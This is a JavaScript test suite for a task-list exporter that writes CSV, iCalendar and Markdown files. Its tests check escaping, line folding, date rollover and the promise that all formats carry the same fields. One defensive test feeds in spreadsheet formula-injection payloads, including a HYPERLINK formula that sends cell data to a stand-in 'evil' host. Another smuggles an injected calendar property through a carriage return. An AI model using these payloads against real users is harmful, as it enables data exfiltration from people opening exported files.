// Contract tests for ShareExport (public/js/share-export.js) — the ONE serializer
// behind every share-page export surface.
//
// The invariants these pin:
//   1. All three formats read the same TASK_COLUMNS field list, so a field cannot
//      be present in the CSV and quietly missing from the Markdown.
//   2. Escaping is correct per format spec, because the failure mode is a file
//      that opens as garbage in Excel or is rejected outright by a calendar app,
//      and neither shows up in a screenshot.
//   3. Output is deterministic given `meta.now`, so this file is testable at all.
const test = require("node:test");
const assert = require("node:assert/strict");
const ShareExport = require("./public/js/share-export.js");

const NOW = new Date("2026-08-19T17:30:00.000Z");

const meta = (over) => Object.assign({
  workspaceName: "Drake",
  owner: "drake",
  date: "2026-08-19",
  url: "https://dcc.app/todo/x7k2m9",
  now: NOW
}, over || {});

const task = (over) => Object.assign({
  id: "task-1",
  blockId: "blk-1",
  title: "Ship the export lane",
  detail: "",
  start: "09:00",
  end: "09:30",
  durationMinutes: 30,
  priority: "high",
  points: 12,
  status: "open",
  itemType: "task",
  itemTypeLabel: "Task",
  calendar: null,
  tags: [],
  createdByGuest: false
}, over || {});

// ── CSV ──────────────────────────────────────────────────────────────────────

test("csv: header matches TASK_COLUMNS exactly, in order", () => {
  const csv = ShareExport.toCsv([], meta());
  const header = csv.split("\r\n")[0];
  assert.equal(header, ShareExport.TASK_COLUMNS.map(c => c.label).join(","));
});

test("csv: quotes only what needs quoting, doubles interior quotes", () => {
  assert.equal(ShareExport._csvCell("plain"), "plain");
  assert.equal(ShareExport._csvCell("has,comma"), '"has,comma"');
  assert.equal(ShareExport._csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(ShareExport._csvCell("line\nbreak"), '"line\nbreak"');
  assert.equal(ShareExport._csvCell(null), "");
});

test("csv: a title with a comma survives a round trip through a naive splitter", () => {
  // The real-world break: a task called "Call Mike, then Collins" turning into two
  // columns and shifting every field after it by one.
  const csv = ShareExport.toCsv([task({ title: "Call Mike, then Collins" })], meta());
  const row = csv.split("\r\n")[1];
  assert.ok(row.includes('"Call Mike, then Collins"'));
  // The title column is index 4; a broken quote would push Type into it.
  const cells = row.match(/("([^"]|"")*"|[^,]*)(,|$)/g).map(s => s.replace(/,$/, ""));
  assert.equal(cells[4], '"Call Mike, then Collins"');
  assert.equal(cells[5], "Task");
});

test("csv: tags and calendar flatten to readable text, not [object Object]", () => {
  const csv = ShareExport.toCsv([task({
    tags: [{ name: "deep work", color: "#fff" }, { name: "clever" }],
    calendar: { id: "c1", name: "Work" }
  })], meta());
  const row = csv.split("\r\n")[1];
  assert.ok(row.includes('"deep work, clever"'), row);
  assert.ok(row.includes("Work"));
  assert.ok(!row.includes("[object"));
});

test("csv: an empty list is still a valid file with a header", () => {
  const csv = ShareExport.toCsv([], meta());
  assert.equal(csv, ShareExport.TASK_COLUMNS.map(c => c.label).join(",") + "\r\n");
});

// ── ICS ──────────────────────────────────────────────────────────────────────

test("ics: well-formed envelope with matching BEGIN/END", () => {
  const ics = ShareExport.toIcs([task()], meta());
  assert.ok(ics.startsWith("BEGIN:VCALENDAR\r\n"));
  assert.ok(ics.trimEnd().endsWith("END:VCALENDAR"));
  assert.equal((ics.match(/BEGIN:VEVENT/g) || []).length, 1);
  assert.equal((ics.match(/END:VEVENT/g) || []).length, 1);
  assert.ok(ics.includes("VERSION:2.0"));
});

test("ics: timed task gets floating DTSTART/DTEND at its wall-clock time", () => {
  const ics = ShareExport.toIcs([task()], meta());
  assert.ok(ics.includes("DTSTART:20260819T090000"), ics);
  assert.ok(ics.includes("DTEND:20260819T093000"), ics);
  // Floating, deliberately: no Z suffix and no TZID, so it imports at 9am in the
  // importer's own zone rather than shifting by the owner's offset.
  assert.ok(!/DTSTART:20260819T090000Z/.test(ics));
});

test("ics: a start with no end gets a real duration, never a zero-length event", () => {
  const ics = ShareExport.toIcs([task({ end: "", durationMinutes: 45 })], meta());
  assert.ok(ics.includes("DTSTART:20260819T090000"));
  assert.ok(ics.includes("DTEND:20260819T094500"), ics);
});

test("ics: an untimed task becomes an all-day event spanning to the next day", () => {
  const ics = ShareExport.toIcs([task({ start: "", end: "", durationMinutes: 0 })], meta());
  assert.ok(ics.includes("DTSTART;VALUE=DATE:20260819"), ics);
  assert.ok(ics.includes("DTEND;VALUE=DATE:20260820"), ics);
});

test("ics: an all-day task on the last of the month rolls the month, not the date", () => {
  const ics = ShareExport.toIcs(
    [task({ start: "", end: "", durationMinutes: 0, date: "2026-08-31" })],
    meta({ date: "2026-08-31" })
  );
  assert.ok(ics.includes("DTEND;VALUE=DATE:20260901"), ics);
});

test("ics: escapes the five reserved characters", () => {
  assert.equal(ShareExport._icsEscape("a,b"), "a\\,b");
  assert.equal(ShareExport._icsEscape("a;b"), "a\\;b");
  assert.equal(ShareExport._icsEscape("a\\b"), "a\\\\b");
  assert.equal(ShareExport._icsEscape("a\nb"), "a\\nb");
  // Backslash first, or escaping the comma would then get its own backslash escaped.
  assert.equal(ShareExport._icsEscape("a\\,b"), "a\\\\\\,b");
});

test("ics: a comma in a title does not split the SUMMARY property", () => {
  const ics = ShareExport.toIcs([task({ title: "Call Mike, then Collins" })], meta());
  assert.ok(ics.includes("SUMMARY:Call Mike\\, then Collins"), ics);
});

test("ics: no unfolded line exceeds 75 octets", () => {
  const longTitle = "Rewrite the onboarding email sequence end to end ".repeat(6);
  const ics = ShareExport.toIcs([task({ title: longTitle })], meta());
  for (const line of ics.split("\r\n")) {
    assert.ok(Buffer.byteLength(line, "utf8") <= 75, "line too long: " + line);
  }
});

test("ics: folding never splits a multi-byte character", () => {
  // An emoji is 4 UTF-8 octets and 2 UTF-16 units. A naive slice(0,75) cuts it in
  // half and the file is corrupt.
  // 63, not 70. At 70 the emoji starts at octet 78 while the only fold boundary
  // falls at 75, inside the run of x -- so this test passed against the very bug
  // it names. At 63 the pair straddles the cut: the pre-fix implementation (which
  // sized UTF-16 code units) leaves a lone high surrogate at end-of-line.
  const title = "x".repeat(63) + "🎯🎯🎯 review";
  const ics = ShareExport.toIcs([task({ title })], meta());
  assert.ok(ics.includes("🎯"), "emoji lost");
  for (const line of ics.split("\r\n")) {
    assert.ok(Buffer.byteLength(line, "utf8") <= 75);
    assert.ok(!/[\uD800-\uDBFF]$/.test(line), "line ends on a lone high surrogate");
  }
  // Unfolding (drop CRLF + one leading space) must give the title back intact.
  const unfolded = [];
  for (const line of ics.split("\r\n")) {
    if (line.startsWith(" ") && unfolded.length) unfolded[unfolded.length - 1] += line.slice(1);
    else unfolded.push(line);
  }
  assert.ok(unfolded.join("\n").includes("🎯🎯🎯 review"), unfolded.join("\n"));
});

test("ics: DTSTAMP is driven by meta.now, so output is byte-stable", () => {
  const a = ShareExport.toIcs([task()], meta());
  const b = ShareExport.toIcs([task()], meta());
  assert.equal(a, b);
  assert.ok(a.includes("DTSTAMP:20260819T173000Z"), a);
});

test("ics: a titleless or dateless row is skipped, but its neighbours survive", () => {
  // The first cut gave meta NO date, so all four rows died on the date guard and
  // the title guard could have been deleted with the test still green. It also
  // could not tell "skipped the bad row" from "emitted nothing at all", which is
  // the failure that matters: one titleless row emptying a 31-day export.
  const ics = ShareExport.toIcs(
    [task({ title: "Keep me" }), task({ id: "t2", title: "" }), null],
    meta({ date: "2026-08-19", from: "", to: "" })
  );
  assert.equal((ics.match(/BEGIN:VEVENT/g) || []).length, 1);
  assert.ok(ics.includes("SUMMARY:Keep me"));
});

test("ics: a row with no date of its own inherits the export's date", () => {
  // Deliberate, and the reason the previous test cannot use a dateless row to
  // prove anything: the day-scoped projection leaves `date` implicit, so a
  // single-day export SHOULD fall back to meta.date. Only when neither exists
  // is the row genuinely undatable and dropped.
  const withMeta = ShareExport.toIcs([task({ date: "" })], meta({ date: "2026-08-19" }));
  assert.ok(withMeta.includes("DTSTART:20260819T090000"), withMeta);
  const without = ShareExport.toIcs([task({ date: "" })], meta({ date: "", from: "", to: "" }));
  assert.equal((without.match(/BEGIN:VEVENT/g) || []).length, 0);
});

// ── Markdown ─────────────────────────────────────────────────────────────────

test("markdown: splits open and done into checkbox sections", () => {
  const md = ShareExport.toMarkdown([
    task({ title: "Open one" }),
    task({ id: "t2", title: "Done one", status: "done" })
  ], meta());
  assert.ok(md.includes("## Open"));
  assert.ok(md.includes("## Done"));
  assert.ok(md.includes("- [ ] **09:00-09:30** Open one"));
  assert.ok(md.includes("- [x] **09:00-09:30** Done one"));
});

test("markdown: notes ride as a nested bullet", () => {
  const md = ShareExport.toMarkdown([task({ detail: "Blocked on the Zapier mapping" })], meta());
  assert.ok(md.includes("  - Blocked on the Zapier mapping"), md);
});

test("markdown: a multi-line note becomes one nested bullet per line, not a list break", () => {
  // Found by exporting a real guest-submitted note. A raw newline ended the list
  // item, so line two rendered as a paragraph and every task after it fell out of
  // the list entirely.
  const md = ShareExport.toMarkdown([
    task({ detail: "Line one\nline two" }),
    task({ id: "t2", title: "Still in the list" })
  ], meta());
  assert.ok(md.includes("  - Line one"), md);
  assert.ok(md.includes("  - line two"), md);
  // Every content line after the heading block is a list item or blank: nothing
  // escaped to the top level.
  const body = md.split("## Open")[1].split("\n---")[0].split("\n").filter(Boolean);
  for (const line of body) assert.match(line, /^(- \[| {2}- )/, "escaped the list: " + line);
  assert.ok(md.includes("- [ ] **09:00-09:30** Still in the list"));
});

test("markdown: a newline in a title collapses instead of breaking the item", () => {
  const md = ShareExport.toMarkdown([task({ title: "Two\nlines" })], meta());
  assert.ok(md.includes("- [ ] **09:00-09:30** Two lines"), md);
});

test("markdown: escapes characters that would become accidental formatting", () => {
  const md = ShareExport.toMarkdown([task({ title: "Fix *urgent* _thing_" })], meta());
  assert.ok(md.includes("Fix \\*urgent\\* \\_thing\\_"), md);
});

test("markdown: an empty list says so rather than rendering a bare heading", () => {
  const md = ShareExport.toMarkdown([], meta());
  assert.ok(md.includes("Nothing on this list yet."));
});

// ── Cross-format ─────────────────────────────────────────────────────────────

test("every format carries the title and the notes: no field present in one and missing in another", () => {
  const rows = [task({ title: "Carry me", detail: "And my note" })];
  for (const format of ShareExport.FORMATS) {
    const out = ShareExport.serialize(format, rows, meta());
    assert.ok(out.includes("Carry me"), format + " dropped the title");
    assert.ok(out.includes("And my note"), format + " dropped the notes");
  }
});

test("serialize rejects an unknown format with a 400, rather than emitting empty text", () => {
  assert.throws(() => ShareExport.serialize("xlsx", [], meta()), (e) => e.statusCode === 400);
  assert.equal(ShareExport.isFormat("csv"), true);
  assert.equal(ShareExport.isFormat("CSV"), true);
  assert.equal(ShareExport.isFormat("xlsx"), false);
});

test("filenames are slugged, dated, and range-aware", () => {
  assert.equal(ShareExport.filenameFor(meta(), "csv"), "drake-2026-08-19.csv");
  assert.equal(
    ShareExport.filenameFor(meta({ from: "2026-08-19", to: "2026-08-25" }), "ics"),
    "drake-2026-08-19_2026-08-25.ics"
  );
  // A workspace name that is all punctuation must not produce a dotfile or "".
  assert.equal(ShareExport.filenameFor(meta({ workspaceName: "!!!", owner: "" }), "md"), "shared-list-2026-08-19.md");
});

test("csv: the column contract is exactly these labels, in this order", () => {
  // A LITERAL list, deliberately. The header test above derives its expectation
  // from TASK_COLUMNS, so it passes for any TASK_COLUMNS: rename Notes to Detail
  // or reorder columns 6-13 and it stays green while every already-downloaded
  // CSV and every spreadsheet import mapping built against this file breaks.
  assert.deepEqual(ShareExport.TASK_COLUMNS.map(c => c.label), [
    "Date", "Start", "End", "Duration (min)", "Title", "Type", "Status",
    "Priority", "Points", "Calendar", "Tags", "Notes", "Added by guest"
  ]);
});

test("csv: a formula-shaped title is neutralized, not executed by a spreadsheet", () => {
  // Reachable by anyone holding the share link: the guest task POST does no
  // character filtering, so this lands in the Title column of a file the owner
  // opens in Excel. Quoting alone does not help; Excel strips quotes and
  // evaluates. A leading apostrophe forces text.
  for (const bad of ['=HYPERLINK("https://evil/?"&A1,"x")', "+1+1", "-1+1", "@SUM(A1)", "\ttab"]) {
    const cell = ShareExport._csvCell(bad);
    assert.ok(cell.startsWith("'") || cell.startsWith("\"'"), "not neutralized: " + cell);
  }
  // A normal title must NOT gain a stray apostrophe.
  assert.equal(ShareExport._csvCell("Ship the export lane"), "Ship the export lane");
  // A negative number is a real value, but it is also formula-shaped; text is
  // the safe answer and the export is for reading, not arithmetic.
  assert.ok(ShareExport._csvCell("-5").startsWith("'"));
});

test("ics: an end at or before the start rolls to the next day, never clamps or zero-lengths", () => {
  const at = (ics, prop) => (ics.split("\r\n").find(l => l.startsWith(prop + ":")) || "");
  // "24:00" is REACHABLE: route-helpers.js clamps a derived end with
  // Math.min(24 * 60, ...), so a 23:30 task with a 60m duration stores it.
  // Hour 24 is not legal in RFC 5545.
  assert.equal(at(ShareExport.toIcs([task({ end: "24:00" })], meta()), "DTEND"), "DTEND:20260820T000000");
  // A genuine midnight crossing keeps its full length instead of losing the tail.
  assert.equal(
    at(ShareExport.toIcs([task({ start: "23:00", end: "00:30", durationMinutes: 90 })], meta()), "DTEND"),
    "DTEND:20260820T003000"
  );
  // 23:59 + 30m used to clamp to 23:59, i.e. DTEND === DTSTART: the exact
  // zero-length event endTimeFor exists to prevent.
  const late = ShareExport.toIcs([task({ start: "23:59", end: "", durationMinutes: 30 })], meta());
  assert.notEqual(at(late, "DTEND").slice(6), at(late, "DTSTART").slice(8));
  assert.equal(at(late, "DTEND"), "DTEND:20260820T002900");
});

test("ics: an explicit end after the start wins over durationMinutes", () => {
  const ics = ShareExport.toIcs([task({ start: "09:00", end: "11:00", durationMinutes: 15 })], meta());
  assert.ok(ics.includes("DTEND:20260819T110000"), ics);
});

test("ics: a bare carriage return cannot inject an iCalendar property", () => {
  assert.equal(ShareExport._icsEscape("a\rb"), "a\\nb");
  const ics = ShareExport.toIcs([task({ title: "Ship it\rSUMMARY:injected" })], meta());
  assert.equal((ics.match(/^SUMMARY:/gm) || []).length, 1, ics);
  // Other C0 controls are stripped rather than emitted raw.
  assert.equal(ShareExport._icsEscape("ab"), "ab");
});

test("a multi-day payload keeps each task on its own date in every format", () => {
  // The route stamps `date` per day precisely because the projection leaves it
  // implicit. Markdown ignored it entirely, so a 31-day export was one
  // undifferentiated list with no way to tell which day anything belonged to.
  const rows = [
    task({ title: "Day A", date: "2026-08-19" }),
    task({ id: "t2", title: "Day B", date: "2026-09-01" })
  ];
  const m = meta({ date: "", from: "2026-08-19", to: "2026-09-01" });
  assert.ok(ShareExport.toCsv(rows, m).includes("2026-09-01"));
  assert.ok(ShareExport.toIcs(rows, m).includes("DTSTART:20260901T090000"));
  const md = ShareExport.toMarkdown(rows, m);
  assert.ok(md.includes("### 2026-08-19"), md);
  assert.ok(md.includes("### 2026-09-01"), md);
  // A single-day export must NOT sprout day headings.
  assert.ok(!ShareExport.toMarkdown([task()], meta()).includes("###"));
});

test("every non-structural column reaches every format: the one-field-list promise", () => {
  // The invariant the module header claims. Before this, only toCsv read
  // TASK_COLUMNS: ICS silently dropped priority/points/tags/addedByGuest and
  // Markdown dropped those plus type/calendar. Add a column and this fails until
  // all three carry it.
  const row = task({
    priority: "high", points: 12, createdByGuest: true,
    calendar: { id: "c1", name: "WorkCal" },
    tags: [{ name: "deepwork" }],
    detail: "A note"
  });
  const m = meta();
  for (const format of ShareExport.FORMATS) {
    const out = ShareExport.serialize(format, [row], m);
    // Read the DECLARED exclusions rather than a literal list, so adding a
    // deliberate per-format omission is a visible edit to the module, not a
    // silent edit to this test.
    const structural = ShareExport.STRUCTURAL_BY_FORMAT[format] || [];
    for (const column of ShareExport.TASK_COLUMNS) {
      if (structural.indexOf(column.key) !== -1) continue;
      const value = String(column.get(row, m) || "");
      if (!value) continue;
      assert.ok(out.includes(value), format + " dropped " + column.label + " (" + value + ")");
    }
  }
});

test("mime types are the ones the importing apps sniff for", () => {
  assert.match(ShareExport.mimeFor("csv"), /^text\/csv/);
  assert.match(ShareExport.mimeFor("ics"), /^text\/calendar/);
  assert.match(ShareExport.mimeFor("md"), /^text\/markdown/);
});
